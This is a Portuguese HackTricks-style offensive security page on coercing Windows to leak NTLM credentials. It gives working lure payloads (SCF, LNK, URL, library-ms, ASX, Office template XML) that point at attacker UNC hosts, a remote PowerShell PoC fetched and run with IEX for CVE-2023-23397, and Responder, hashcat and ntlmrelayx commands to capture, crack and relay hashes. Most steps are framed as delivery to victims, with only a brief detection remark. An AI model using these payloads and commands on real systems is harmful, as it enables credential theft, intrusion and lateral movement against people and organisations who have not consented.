# Locais para roubar credenciais NTLM

{{#include ../../banners/hacktricks-training.md}}

**Confira todas as ótimas ideias de [https://osandamalith.com/2017/03/24/places-of-interest-in-stealing-netntlm-hashes/](https://osandamalith.com/2017/03/24/places-of-interest-in-stealing-netntlm-hashes/), desde baixar um arquivo do Microsoft Word online até a origem de leaks de NTLM: https://github.com/soufianetahiri/TeamsNTLMLeak/blob/main/README.md e [https://github.com/p0dalirius/windows-coerced-authentication-methods](https://github.com/p0dalirius/windows-coerced-authentication-methods)**<sup>[[12]](#references)[[13]](#references)[[14]](#references)</sup>

### Share SMB gravável + iscas UNC acionadas pelo Explorer (ntlm_theft/SCF/LNK/library-ms/desktop.ini)

Se você consegue **gravar em um share que os usuários ou tarefas agendadas acessam no Explorer**, coloque arquivos cujos metadados apontem para o seu UNC (por exemplo, `\\ATTACKER\share`). A exibição da pasta aciona **autenticação SMB implícita** e vaza um **NetNTLMv2** para o seu listener.<sup>[[1]](#references)</sup>

1. **Gere iscas** (inclui SCF/URL/LNK/library-ms/desktop.ini/Office/RTF/etc.)

```bash
git clone https://github.com/Greenwolf/ntlm_theft && cd ntlm_theft
uv add --script ntlm_theft.py xlsxwriter
uv run ntlm_theft.py -g all -s <attacker_ip> -f lure
```

2. **Coloque-os no compartilhamento gravável** (qualquer pasta que a vítima abra):

```bash
smbclient //victim/share -U 'guest%'
cd transfer\
prompt off
mput lure/*
```

3. **Ouça e crack**:

```bash
sudo responder -I <iface>          # capture NetNTLMv2
hashcat hashes.txt /opt/SecLists/Passwords/Leaked-Databases/rockyou.txt  # autodetects mode 5600
```

O Windows pode acessar vários arquivos de uma só vez; qualquer coisa que o Explorer pré-visualize (`BROWSE TO FOLDER`) não exige cliques.

### Playlists do Windows Media Player (.ASX/.WAX)

Se você conseguir fazer um alvo abrir ou pré-visualizar uma playlist do Windows Media Player sob seu controle, poderá vazar Net-NTLMv2 apontando a entrada para um caminho UNC. O WMP tentará buscar a mídia referenciada por SMB e fará a autenticação implicitamente.<sup>[[3]](#references)[[4]](#references)</sup>

Exemplo de payload:

```xml
<asx version="3.0">
  <title>Leak</title>
  <entry>
    <title></title>
    <ref href="file://ATTACKER_IP\\share\\track.mp3" />
  </entry>
</asx>
```

Fluxo de coleta e cracking:

```bash
# Capture the authentication
sudo Responder -I <iface>

# Crack the captured NetNTLMv2
hashcat hashes.txt /opt/SecLists/Passwords/Leaked-Databases/rockyou.txt
```

### ZIP-embedded .library-ms NTLM leak (CVE-2025-24071/24055)

O Windows Explorer lida de forma insegura com arquivos .library-ms quando são abertos diretamente de dentro de um arquivo ZIP. Se a definição da biblioteca apontar para um caminho UNC remoto (por exemplo, \\attacker\share), basta navegar até ou abrir o arquivo .library-ms dentro do ZIP para que o Explorer enumere o UNC e envie autenticação NTLM ao atacante. Isso gera um NetNTLMv2 que pode ser quebrado offline ou potencialmente retransmitido.<sup>[[2]](#references)</sup>

Arquivo .library-ms mínimo apontando para um UNC do atacante

```xml
<?xml version="1.0" encoding="UTF-8"?>
<libraryDescription xmlns="http://schemas.microsoft.com/windows/2009/library">
  <version>6</version>
  <name>Company Documents</name>
  <isLibraryPinned>false</isLibraryPinned>
  <iconReference>shell32.dll,-235</iconReference>
  <templateInfo>
    <folderType>{7d49d726-3c21-4f05-99aa-fdc2c9474656}</folderType>
  </templateInfo>
  <searchConnectorDescriptionList>
    <searchConnectorDescription>
      <simpleLocation>
        <url>\\10.10.14.2\share</url>
      </simpleLocation>
    </searchConnectorDescription>
  </searchConnectorDescriptionList>
</libraryDescription>
```

Etapas operacionais
- Crie o arquivo .library-ms com o XML acima (defina seu IP/hostname).
- Compacte-o em um ZIP (no Windows: Enviar para → Pasta compactada) e entregue o ZIP ao alvo.
- Execute um listener de captura NTLM e aguarde a vítima abrir o arquivo .library-ms dentro do ZIP.


### Caminho do som de lembrete do calendário do Outlook (CVE-2023-23397) – leak de Net-NTLMv2 zero-click

O Microsoft Outlook para Windows processava a propriedade MAPI estendida PidLidReminderFileParameter em itens do calendário. Se essa propriedade apontasse para um caminho UNC (por exemplo, \\attacker\share\alert.wav), o Outlook se conectaria ao compartilhamento SMB quando o lembrete fosse acionado, causando o leak do Net-NTLMv2 do usuário sem nenhum clique. Isso foi corrigido em 14 de março de 2023, mas ainda é altamente relevante para frotas legadas/não atualizadas e para a resposta a incidentes históricos.<sup>[[5]](#references)</sup>

Exploração rápida com PowerShell (Outlook COM):

```powershell
# Run on a host with Outlook installed and a configured mailbox
IEX (iwr -UseBasicParsing https://raw.githubusercontent.com/api0cradle/CVE-2023-23397-POC-Powershell/main/CVE-2023-23397.ps1)
Send-CalendarNTLMLeak -recipient user@example.com -remotefilepath "\\10.10.14.2\share\alert.wav" -meetingsubject "Update" -meetingbody "Please accept"
# Variants supported by the PoC include \\host@80\file.wav and \\host@SSL@443\file.wav
```

Lado do listener:

```bash
sudo responder -I eth0  # or impacket-smbserver to observe connections
```

Notas
- A vítima só precisa estar com o Outlook para Windows aberto quando o lembrete for acionado.
- O leak fornece Net‑NTLMv2 adequado para cracking offline ou relay (não pass-the-hash).


### Leak de NTLM zero-click baseado em ícones .LNK/.URL (CVE‑2025‑50154 – bypass de CVE‑2025‑24054)

O Windows Explorer renderiza automaticamente os ícones dos atalhos. Pesquisas recentes mostraram que, mesmo após o patch da Microsoft de abril de 2025 para atalhos com ícones UNC, ainda era possível acionar a autenticação NTLM sem nenhum clique, hospedando o destino do atalho em um caminho UNC e mantendo o ícone local (o bypass do patch recebeu o identificador CVE‑2025‑50154). Apenas visualizar a pasta faz com que o Explorer recupere metadados do destino remoto, enviando NTLM ao servidor SMB do atacante.<sup>[[6]](#references)</sup>

Payload mínimo de Internet Shortcut (.url):

```ini
[InternetShortcut]
URL=http://intranet
IconFile=\\10.10.14.2\share\icon.ico
IconIndex=0
```

Programar payload de atalho (.lnk) via PowerShell:

```powershell
$lnk = "$env:USERPROFILE\Desktop\lab.lnk"
$w = New-Object -ComObject WScript.Shell
$sc = $w.CreateShortcut($lnk)
$sc.TargetPath = "\\10.10.14.2\share\payload.exe"  # remote UNC target
$sc.IconLocation = "C:\\Windows\\System32\\SHELL32.dll" # local icon to bypass UNC-icon checks
$sc.Save()
```

Ideias de entrega
- Coloque o atalho em um ZIP e faça a vítima navegar até ele.
- Coloque o atalho em um compartilhamento com permissão de gravação que a vítima abrirá.
- Combine-o com outros arquivos-isca na mesma pasta para que o Explorer visualize os itens.

### Leak de NTLM em `.LNK` sem clique via caminho do ícone ExtraData (CVE‑2026‑25185)

O Windows carrega os metadados de `.lnk` durante a **visualização/pré-visualização** (renderização do ícone), não apenas na execução. A CVE‑2026‑25185 mostra um caminho de análise em que blocos **ExtraData** fazem o shell resolver um caminho de ícone e acessar o sistema de arquivos **durante o carregamento**, emitindo NTLM de saída quando o caminho é remoto.

Principais condições de acionamento (observadas em `CShellLink::_LoadFromStream`):
- Inclua **DARWIN_PROPS** (`0xa0000006`) em ExtraData (condição para a rotina de atualização do ícone).
- Inclua **ICON_ENVIRONMENT_PROPS** (`0xa0000007`) com **TargetUnicode** preenchido.
- O carregador expande as variáveis de ambiente em `TargetUnicode` e chama `PathFileExistsW` no caminho resultante.

Se `TargetUnicode` resolver para um caminho UNC (por exemplo, `\\attacker\share\icon.ico`), **apenas visualizar uma pasta** que contenha o atalho causa autenticação de saída. Esse mesmo caminho de carregamento também pode ser acionado pela **indexação** e pela **verificação de AV**, tornando-o uma superfície prática de leak sem clique.<sup>[[7]](#references)</sup>

Há ferramentas de pesquisa (parser/generator/UI) disponíveis no projeto **LnkMeMaybe** para criar/inspecionar essas estruturas sem usar a GUI do Windows.<sup>[[8]](#references)</sup>


### Coerção de autenticação WebDAV / validação de credenciais via `davclnt.dll,DavSetCookie`

O **cliente WebDAV** nativo pode ser abusado para forçar a sessão de logon atual a se autenticar em um endpoint **HTTP/WebDAV** arbitrário:

```cmd
rundll32.exe davclnt.dll,DavSetCookie <HOST> http://<TARGET>/C$/Windows
```

Por que isso é útil:
- Contra um **servidor WebDAV controlado pelo atacante**, isso pode acionar **NTLM over HTTP** sem implantar um cliente personalizado.
- Contra **hosts internos**, é uma forma discreta de **validar onde as credenciais roubadas são aceitas** antes de se mover lateralmente.<sup>[[9]](#references)</sup>
- O comando é uma boa alternativa quando a saída **SMB** é filtrada, mas **HTTP/WebDAV** ainda está acessível.

Observações operacionais:
- O serviço **WebClient** precisa estar em execução no host de origem.
- `rundll32.exe` carrega `davclnt.dll` e faz com que o Windows trate a autenticação WebDAV usando as **credenciais do usuário atual**.<sup>[[10]](#references)</sup>
- Se você apontar para uma infraestrutura que controla, use um listener/relay HTTP compatível com NTLM, como:

```bash
# Capture or relay NTLM over HTTP/WebDAV
ntlmrelayx.py -t smb://<TARGET> --http-port 80
```

Do ponto de vista da detecção, execuções repetidas de `rundll32.exe davclnt.dll,DavSetCookie` contra muitos sistemas internos são um forte indicador de **validação de credenciais / preparação para movimentação lateral semelhante a password spraying**, e não de comportamento normal de usuário.<sup>[[9]](#references)[[11]](#references)</sup>

### Injeção de template remoto do Office (.docx/.dotm) para forçar NTLM

Documentos do Office podem referenciar um template externo. Se você definir o template anexado como um caminho UNC, abrir o documento fará a autenticação via SMB.

Alterações mínimas na relação do DOCX (dentro de word/):

1) Edite word/settings.xml e adicione a referência ao template anexado:

```xml
<w:attachedTemplate r:id="rId1337" xmlns:w="http://schemas.openxmlformats.org/wordprocessingml/2006/main" xmlns:r="http://schemas.openxmlformats.org/officeDocument/2006/relationships"/>
```

2) Edite word/_rels/settings.xml.rels e configure rId1337 para apontar para seu UNC:

```xml
<Relationship Id="rId1337" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/attachedTemplate" Target="\\\\10.10.14.2\\share\\template.dotm" TargetMode="External" xmlns="http://schemas.openxmlformats.org/package/2006/relationships"/>
```

3) Reempacote como .docx e entregue. Inicie seu listener de captura SMB e aguarde a abertura.

Para ideias após a captura sobre relay ou abuso de NTLM, consulte:

{{#ref}}
README.md
{{#endref}}


## References
- [1] [HTB: Breach – Iscas em compartilhamentos graváveis + captura com Responder → quebra de NetNTLMv2 → Kerberoast de svc_mssql](https://0xdf.gitlab.io/2026/02/10/htb-breach.html)
- [2] [HTB Fluffy – ZIP .library‑ms auth leak (CVE‑2025‑24071/24055) → GenericWrite → AD CS ESC16 até DA (0xdf)](https://0xdf.gitlab.io/2025/09/20/htb-fluffy.html)
- [3] [HTB: Media — NTLM leak do WMP → junction NTFS para webroot RCE → FullPowers + GodPotato para SYSTEM](https://0xdf.gitlab.io/2025/09/04/htb-media.html)
- [4] [Morphisec – 5 vulnerabilidades NTLM: Ameaças de escalada de privilégios não corrigidas na Microsoft](https://www.morphisec.com/blog/5-ntlm-vulnerabilities-unpatched-privilege-escalation-threats-in-microsoft/)
- [5] [MSRC – Microsoft mitiga a vulnerabilidade EoP do Outlook (CVE‑2023‑23397) e explica o NTLM leak via PidLidReminderFileParameter](https://www.microsoft.com/en-us/msrc/blog/2023/03/microsoft-mitigates-outlook-elevation-of-privilege-vulnerability/)
- [6] [Cymulate – Zero-click, um NTLM: bypass do patch de segurança da Microsoft (CVE‑2025‑50154)](https://cymulate.com/blog/zero-click-one-ntlm-microsoft-security-patch-bypass-cve-2025-50154/)
- [7] [TrustedSec – LnkMeMaybe: Uma análise de CVE‑2026‑25185](https://trustedsec.com/blog/lnkmemaybe-a-review-of-cve-2026-25185)
- [8] [Ferramentas LnkMeMaybe da TrustedSec](https://github.com/trustedsec/LnkMeMaybe)
- [9] [Rapid7 – Quando o suporte de TI liga: análise de uma campanha ModeloRAT, do Teams ao comprometimento do domínio](https://www.rapid7.com/blog/post/tr-it-support-dissecting-modelorat-campaign-microsoft-teams-compromise)
- [10] [Microsoft Learn – cabeçalho davclnt.h](https://learn.microsoft.com/en-us/windows/win32/api/davclnt/)
- [11] [Splunk – Solicitação WebDAV do Windows Rundll32](https://research.splunk.com/endpoint/320099b7-7eb1-4153-a2b4-decb53267de2/)
- [12] [osandamalith.com - Locais de interesse para roubar hashes NetNTLM](https://osandamalith.com/2017/03/24/places-of-interest-in-stealing-netntlm-hashes)
- [13] [soufianetahiri/TeamsNTLMLeak](https://github.com/soufianetahiri/TeamsNTLMLeak/blob/main/README.md)
- [14] [p0dalirius/windows-coerced-authentication-methods](https://github.com/p0dalirius/windows-coerced-authentication-methods)
{{#include ../../banners/hacktricks-training.md}}
